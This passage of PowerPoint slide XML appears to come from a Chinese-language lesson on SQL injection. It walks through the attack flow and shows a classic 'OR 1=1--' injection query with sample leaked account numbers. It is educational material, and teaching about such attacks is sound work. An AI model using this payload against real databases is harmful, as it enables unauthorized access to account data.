                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437300" name="Rectangle 52"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2438400" y="1905000"/>
            <a:ext cx="909638" cy="950913"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EFEFFF"/>
          </a:solidFill>
          <a:ln w="38100" cmpd="dbl" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>HTTP response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial Narrow" panose="020B0606020202030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437301" name="Rectangle 53"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6372225" y="1346200"/>
            <a:ext cx="2422525" cy="1146175"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SELECT * FROM accounts WHERE acct=‘’ OR 1=1--’”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437302" name="Text Box 54"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6019800" y="2890838"/>
            <a:ext cx="3124200" cy="538162"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1. Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>程序提供了用户输入的表单；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437303" name="Text Box 55"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6048375" y="3500438"/>
            <a:ext cx="3095625" cy="496887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>攻击者通过填写表单数据发起攻击；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437304" name="Text Box 56"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6056313" y="4130675"/>
            <a:ext cx="3124200" cy="522288"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>3. Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>程序通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>语句的形式将攻击递交给数据库；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437305" name="Rectangle 57"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6019800" y="1341438"/>
            <a:ext cx="2963863" cy="1374775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Account Summary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Acct:5424-6066-2134-4334</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Acct:4128-7574-3921-0192</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Acct:5424-9383-2039-4029</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Acct:4128-0004-1234-0293</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437306" name="Text Box 58"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6056313" y="4783138"/>
            <a:ext cx="3124200" cy="517525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>数据库执行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>语句，将执行结果加密后返回给应用程序；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="437307" name="Text Box 59"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6056313" y="5445125"/>
            <a:ext cx="3124200" cy="519113"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>应用程序解密数据，将结果发送给用户（攻击者）。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 60"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6156325" y="1341438"/>
            <a:ext cx="2613025" cy="1287462"/>
            <a:chOff x="5424" y="3360"/>
            <a:chExt cx="1646" cy="811"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="437309" name="Picture 61"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2" cstate="print"/>
            <a:srcRect/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5424" y="3360"/>
              <a:ext cx="1646" cy="811"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="437310" name="Text Box 62"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5483" y="3504"/>
              <a:ext cx="501" cy="162"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
            <a:ln w="9525" algn="ctr">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="45720" rIns="45720">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="r" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>Account:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="437311" name="Text Box 63"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5472" y="3678"/>
              <a:ext cx="508" cy="162"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
            <a:ln w="9525" algn="ctr">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="45720" rIns="45720">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="r" eaLnBrk="0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>       </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>SKU:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200">
